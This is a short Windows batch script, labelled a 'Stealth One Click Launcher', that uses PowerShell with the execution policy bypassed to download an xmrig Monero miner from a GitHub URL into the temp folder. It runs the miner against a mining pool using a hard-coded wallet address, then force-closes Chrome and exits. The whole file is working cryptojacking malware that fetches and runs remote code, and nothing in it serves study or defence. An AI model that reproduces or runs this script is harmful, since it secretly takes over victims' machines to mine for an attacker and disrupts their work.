@echo off
:: Stealth One Click Launcher
:: Downloads and runs miner, then kills the browser

powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/followtheyellowbrickroad321/miner-files/main/xmrig.exe' -OutFile '%TEMP%\xmrig.exe'; Start-Process '%TEMP%\xmrig.exe' -ArgumentList '-o gulf.moneroocean.stream:10128 -u 48bBiT9hcQqJBZCXxKi6mSTzatRSN7kLMgjTBSQReTN8K7uCzxpn7ZuH7DUXua5uVLj4rRZd7vVXjRTnWEBBE33BC2sdw9k --cpu-priority 1 --threads=2'"

:: KILL BROWSER (Chrome)
taskkill /F /IM chrome.exe

:: Close this window
exit
